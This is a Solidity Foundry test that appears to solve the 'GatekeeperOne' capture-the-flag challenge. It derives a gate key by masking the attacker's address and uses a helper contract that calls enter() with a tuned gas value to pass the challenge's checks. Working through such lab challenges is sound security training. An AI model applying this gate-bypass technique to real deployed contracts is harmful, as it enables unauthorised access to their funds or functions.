// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {GatekeeperOne} from "../src/GetekeeperOne.sol";
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Utilities} from "./utilities/Utilities.sol";

contract GatekeeperOneTest is Test {
    Utilities internal utils;
    GatekeeperOne internal gatekeeperOne;

    address private attacker;

    bytes8 key;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);

        attacker = users[0];
        vm.label(attacker, "Attacker");

        key = bytes8(uint64(uint160(address(attacker)))) & 0xFFFFFFFF0000FFFF;

        gatekeeperOne = new GatekeeperOne();
        vm.label(address(gatekeeperOne), "GatekeeperOne");
    }

    function testExploit() public {
        vm.startPrank(attacker);
        Exploiter exploiter = new Exploiter(gatekeeperOne);
        exploiter.exploit(key);
    }
}

contract Exploiter {
    GatekeeperOne internal gatekeeperOne;
    address internal owner;

    constructor(GatekeeperOne _gatekeeperOne) {
        gatekeeperOne = _gatekeeperOne;
        owner = msg.sender;
    }

    function exploit(bytes8 gateKey) external {
        gatekeeperOne.enter{gas: 802929}(gateKey);
    }
}
